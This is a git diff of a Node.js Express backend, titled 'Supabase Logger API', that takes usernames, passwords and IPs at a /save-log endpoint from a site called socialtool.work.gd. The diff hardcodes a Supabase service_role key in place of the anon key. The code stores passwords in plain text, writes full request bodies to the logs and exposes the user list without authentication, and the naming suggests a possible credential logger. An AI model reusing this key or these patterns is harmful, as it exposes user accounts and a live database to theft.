@@ -3,31 +3,66 @@ const cors = require('cors');
 const { createClient } = require('@supabase/supabase-js');
 const app = express();
 
-app.use(cors());
-app.use(express.json());
+// ROZSZERZONA KONFIGURACJA CORS - NA SAMYM POCZĄTKU
+app.use(cors({
+    origin: [
+        'https://socialtool.work.gd',
+        'https://m1des1.github.io',
+        'http://localhost:3000',
+        'http://localhost:8080',
+        'http://localhost:5500'
+    ],
+    credentials: true,
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Origin', 'Accept']
+}));
 
-// Konfiguracja Supabase z Twoimi danymi
+// Obsługa preflight requests
+app.options('*', cors());
+
+// Parsowanie JSON
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true }));
+
+// Middleware do logowania
+app.use((req, res, next) => {
+    console.log('=== 📨 INCOMING REQUEST ===');
+    console.log('Method:', req.method);
+    console.log('URL:', req.url);
+    console.log('Headers:', req.headers.origin);
+    console.log('Body:', req.body);
+    console.log('=== 🏁 END REQUEST LOG ===');
+    next();
+});
+
+// Konfiguracja Supabase
 const supabaseUrl = 'https://kazlfzeinvzpyywpilkk.supabase.co';
-const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImthemxmemVpbnZ6cHl5d3BpbGtrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMxMjYzNzgsImV4cCI6MjA3ODcwMjM3OH0.BvquQ7gTnvwllXzg60sYdXXpQqmM_O5bkxoh5S8Bn3Q';
+const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImthemxmemVpbnZ6cHl5d3BpbGtrIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2MzEyNjM3OCwiZXhwIjoyMDc4NzAyMzc4fQ.M4DN5LWKX9LcDZFkBwRz5mVv0dlr2_UgDAq96l48flU';
 const supabase = createClient(supabaseUrl, supabaseKey);
 
 // Funkcja do sprawdzania czy użytkownik istnieje
 async function checkIfUserExists(username) {
     try {
+        console.log('🔍 Checking user:', username);
         const { data, error } = await supabase
             .from('users')
             .select('username')
             .eq('username', username)
             .single();
 
-        if (error && error.code !== 'PGRST116') { // PGRST116 = no rows returned
-            console.error('Błąd przy sprawdzaniu użytkownika:', error);
+        if (error) {
+            if (error.code === 'PGRST116') {
+                console.log('✅ User does not exist');
+                return false;
+            }
+            console.error('❌ DB Error checking user:', error);
             return false;
         }
 
-        return !!data; // zwraca true jeśli użytkownik istnieje
+        console.log('✅ User exists:', data);
+        return !!data;
     } catch (error) {
-        console.error('Błąd przy sprawdzaniu użytkownika:', error);
+        console.error('❌ Error checking user:', error);
         return false;
     }
 }
@@ -35,20 +70,26 @@ async function checkIfUserExists(username) {
 // Funkcja do sprawdzania czy IP ma już konto
 async function checkIfIPExists(ip) {
     try {
+        console.log('🔍 Checking IP:', ip);
         const { data, error } = await supabase
             .from('users')
             .select('ip')
             .eq('ip', ip)
             .single();
 
-        if (error && error.code !== 'PGRST116') {
-            console.error('Błąd przy sprawdzaniu IP:', error);
+        if (error) {
+            if (error.code === 'PGRST116') {
+                console.log('✅ IP does not exist');
+                return false;
+            }
+            console.error('❌ DB Error checking IP:', error);
             return false;
         }
 
-        return !!data; // zwraca true jeśli IP ma konto
+        console.log('✅ IP exists:', data);
+        return !!data;
     } catch (error) {
-        console.error('Błąd przy sprawdzaniu IP:', error);
+        console.error('❌ Error checking IP:', error);
         return false;
     }
 }
@@ -56,80 +97,97 @@ async function checkIfIPExists(ip) {
 // Funkcja do zapisywania użytkownika
 async function saveUserToDatabase(username, password, ip) {
     try {
+        console.log('💾 Saving user to database...');
+        
+        const userData = {
+            username: username,
+            password: password,
+            ip: ip,
+            version: '2.0'
+        };
+
+        console.log('📝 User data:', userData);
+
         const { data, error } = await supabase
             .from('users')
-            .insert([
-                {
-                    username: username,
-                    password: password,
-                    ip: ip,
-                    version: '2.0',
-                    created_at: new Date().toISOString()
-                }
-            ])
+            .insert([userData])
             .select();
 
         if (error) {
-            console.error('Błąd zapisu do bazy:', error);
+            console.error('❌ Database insert error:', {
+                code: error.code,
+                message: error.message,
+                details: error.details,
+                hint: error.hint
+            });
             return false;
         }
 
-        console.log('✅ Pomyślnie dodano użytkownika:', data);
+        console.log('✅ User saved successfully:', data);
         return true;
     } catch (error) {
-        console.error('❌ Błąd zapisu:', error);
+        console.error('💥 Critical save error:', error);
         return false;
     }
 }
 
-// Główna endpoint do rejestracji
+// Główny endpoint rejestracji
 app.post('/save-log', async (req, res) => {
     console.log('=== 🆕 NOWA REJESTRACJA ===');
     console.log('📨 Otrzymano żądanie:', req.body);
     
     const { username, password, ip } = req.body;
     
-    if (!username || !password) {
-        return res.json({ success: false, message: 'Brak danych' });
+    // Walidacja danych
+    if (!username || !password || !ip) {
+        console.log('❌ Missing data:', { username, password, ip });
+        return res.status(400).json({ 
+            success: false, 
+            message: 'Brak wymaganych danych: username, password, ip' 
+        });
     }
 
-    // Sprawdź czy użytkownik już istnieje
     console.log('🔍 Sprawdzanie czy użytkownik istnieje...');
     const userExists = await checkIfUserExists(username);
     if (userExists) {
         console.log('❌ Użytkownik już istnieje:', username);
-        return res.json({ success: false, message: 'Nazwa użytkownika jest już zajęta' });
+        return res.status(409).json({ 
+            success: false, 
+            message: 'Nazwa użytkownika jest już zajęta' 
+        });
     }
 
-    // Sprawdź czy IP ma już konto
     console.log('🔍 Sprawdzanie czy IP ma już konto...');
     const ipExists = await checkIfIPExists(ip);
     if (ipExists) {
         console.log('❌ IP ma już konto:', ip);
-        return res.json({ success: false, message: 'Za dużo użytkowników zostało zarejestrowanych na tym IP' });
+        return res.status(409).json({ 
+            success: false, 
+            message: 'Za dużo użytkowników zostało zarejestrowanych na tym IP' 
+        });
     }
 
     console.log('✅ Użytkownik i IP są dostępne, zapisywanie do bazy...');
-
-    // Zapisz do bazy danych
-    console.log('💾 Zapisywanie do Supabase...');
     const saveResult = await saveUserToDatabase(username, password, ip);
 
     if (saveResult) {
-        console.log('🎉 Rejestracja udana dla:', username, 'z IP:', ip);
+        console.log('🎉 Rejestracja udana dla:', username);
         res.json({ 
             success: true, 
             message: 'Rejestracja udana!' 
         });
     } else {
         console.log('💥 Błąd rejestracji dla:', username);
-        res.json({ success: false, message: 'Błąd podczas rejestracji' });
+        res.status(500).json({ 
+            success: false, 
+            message: 'Błąd podczas rejestracji' 
+        });
     }
     
     console.log('=== ✅ KONIEC REJESTRACJI ===\n');
 });
 
-// Endpoint do sprawdzania wszystkich użytkowników
+// Pozostałe endpointy
 app.get('/check-logs', async (req, res) => {
     console.log('=== 📊 SPRAWDZANIE UŻYTKOWNIKÓW ===');
     
@@ -140,8 +198,8 @@ app.get('/check-logs', async (req, res) => {
             .order('created_at', { ascending: false });
 
         if (error) {
-            console.error('Błąd:', error);
-            return res.json({ success: false, error: error.message });
+            console.error('❌ DB Error:', error);
+            return res.status(500).json({ success: false, error: error.message });
         }
 
         console.log('📋 Znalezionych użytkowników:', data?.length || 0);
@@ -154,12 +212,11 @@ app.get('/check-logs', async (req, res) => {
         });
 
     } catch (error) {
-        console.error('❌ Błąd:', error);
-        res.json({ success: false, error: error.message });
+        console.error('❌ Error:', error);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Endpoint do sprawdzania konkretnego użytkownika
 app.get('/check-user/:username', async (req, res) => {
     const username = req.params.username;
     console.log(`🔍 Sprawdzanie użytkownika: ${username}`);
@@ -173,7 +230,6 @@ app.get('/check-user/:username', async (req, res) => {
     });
 });
 
-// Endpoint do sprawdzania IP
 app.get('/check-ip/:ip', async (req, res) => {
     const ip = req.params.ip;
     console.log(`🔍 Sprawdzanie IP: ${ip}`);
@@ -187,45 +243,17 @@ app.get('/check-ip/:ip', async (req, res) => {
     });
 });
 
-// Endpoint do usuwania użytkownika (przydatne do testów)
-app.delete('/delete-user/:username', async (req, res) => {
-    const username = req.params.username;
-    console.log(`🗑️ Usuwanie użytkownika: ${username}`);
-    
-    try {
-        const { error } = await supabase
-            .from('users')
-            .delete()
-            .eq('username', username);
-
-        if (error) {
-            console.error('Błąd usuwania:', error);
-            return res.json({ success: false, error: error.message });
-        }
-
-        res.json({
-            success: true,
-            message: `Użytkownik ${username} został usunięty`
-        });
-    } catch (error) {
-        console.error('❌ Błąd:', error);
-        res.json({ success: false, error: error.message });
-    }
-});
-
-// Endpoint główny
 app.get('/', (req, res) => {
     res.json({ 
         message: 'Supabase Logger API działa!', 
         status: 'online',
         database: 'Supabase PostgreSQL',
-        project: 'kazlfzeinvzpyywpilkk',
+        cors: 'Enabled for socialtool.work.gd',
         endpoints: {
             'POST /save-log': 'Rejestracja użytkownika',
-            'GET /check-logs': 'Sprawdź użytkowników (JSON)',
-            'GET /check-user/:username': 'Sprawdź czy użytkownik istnieje',
-            'GET /check-ip/:ip': 'Sprawdź czy IP ma konto',
-            'DELETE /delete-user/:username': 'Usuń użytkownika (testy)'
+            'GET /check-logs': 'Sprawdź użytkowników',
+            'GET /check-user/:username': 'Sprawdź użytkownika',
+            'GET /check-ip/:ip': 'Sprawdź IP'
         }
     });
 });
@@ -233,13 +261,6 @@ app.get('/', (req, res) => {
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📊 Supabase API działa`);
-    console.log(`🔗 URL: ${supabaseUrl}`);
-    console.log(`📋 Dostępne endpointy:`);
-    console.log(`   GET  / - Status API`);
-    console.log(`   POST /save-log - Rejestracja użytkownika`);
-    console.log(`   GET  /check-logs - Sprawdź użytkowników`);
-    console.log(`   GET  /check-user/:username - Sprawdź użytkownika`);
-    console.log(`   GET  /check-ip/:ip - Sprawdź IP`);
-    console.log(`   DELETE /delete-user/:username - Usuń użytkownika`);
+    console.log(`📊 Supabase API z tabelą users`);
+    console.log(`🌐 CORS enabled for: socialtool.work.gd`);
 });
